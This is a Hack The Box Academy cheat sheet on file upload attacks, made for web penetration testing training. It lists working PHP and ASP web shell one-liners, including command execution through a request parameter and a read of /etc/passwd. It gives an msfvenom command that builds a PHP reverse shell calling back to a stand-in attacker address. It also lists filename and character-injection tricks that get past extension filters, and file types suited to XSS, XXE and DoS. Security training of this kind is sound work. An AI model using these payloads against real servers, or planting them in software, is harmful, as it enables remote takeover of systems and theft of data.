---
title: File Upload Attacks
description: Arbitrary file uploads are among the most critical web vulnerabilities. These flaws enable attackers to upload malicious files, execute arbitrary commands on the back-end server, and even take control over the entire server and all web applications hosted on it and potentially gain access to sensitive data or cause a service disruption.
author:
  - 21y4d
difficulty: Medium
tier: 2
type: Offensive
time: 8 hours
badge: /cheatsheets/badges/prepare-your-payload-and-up-you-go.webp
module: /cheatsheets/file-upload-attacks.webp
badgeLink: https://academy.hackthebox.com/achievement/badge/62f57d86-fbec-11ee-b18d-bea50ffe6cb4
moduleLink: https://academy.hackthebox.com/achievement/361848/136
completedAt: 2024-04-16
tags:
  - cheatsheet
  - CBBH
---
## Web Shells

|**Web Shell**|**Description**|
|---|---|
|`<?php file_get_contents('/etc/passwd'); ?>`|Basic PHP File Read|
|`<?php system('hostname'); ?>`|Basic PHP Command Execution|
|`<?php system($_REQUEST['cmd']); ?>`|Basic PHP Web Shell|
|`<% eval request('cmd') %>`|Basic ASP Web Shell|
|`msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`|Generate PHP reverse shell|
|[PHP Web Shell](https://github.com/Arrexel/phpbash)|PHP Web Shell|
|[PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)|PHP Reverse Shell|
|[Web/Reverse Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)|List of Web Shells and Reverse Shells|

## Bypasses

|**Command**|**Description**|
|---|---|
|**Client-Side Bypass**||
|`[CTRL+SHIFT+C]`|Toggle Page Inspector|
|**Blacklist Bypass**||
|`shell.phtml`|Uncommon Extension|
|`shell.pHp`|Case Manipulation|
|[PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)|List of PHP Extensions|
|[ASP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)|List of ASP Extensions|
|[Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)|List of Web Extensions|
|**Whitelist Bypass**||
|`shell.jpg.php`|Double Extension|
|`shell.php.jpg`|Reverse Double Extension|
|`%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `.`, `…`|Character Injection - Before/After Extension|
|**Content/Type Bypass**||
|[Web Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)|List of Web Content-Types|
|[Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)|List of All Content-Types|
|[File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)|List of File Signatures/Magic Bytes|

## Limited Uploads

|**Potential Attack**|**File Types**|
|---|---|
|`XSS`|HTML, JS, SVG, GIF|
|`XXE`/`SSRF`|XML, SVG, PDF, PPT, DOC|
|`DoS`|ZIP, JPG, PNG|